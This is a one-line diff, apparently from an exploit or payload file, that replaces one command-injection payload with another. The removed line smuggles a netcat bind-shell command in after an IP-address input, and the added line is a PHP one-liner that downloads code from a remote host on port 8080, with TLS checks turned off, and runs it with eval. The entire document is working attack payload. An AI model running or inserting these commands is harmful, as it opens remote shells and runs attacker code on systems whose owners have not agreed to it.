@@ -1,1 +1,1 @@
-192.168.0.1; /tmp/pipe;sh /tmp/pipe | nc -l 4444 > /tmp/pipe
+php -d allow_url_fopen=true -r "eval(file_get_contents('http://192.168.1.86:8080/uxEawCZfeHKtsM', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));"
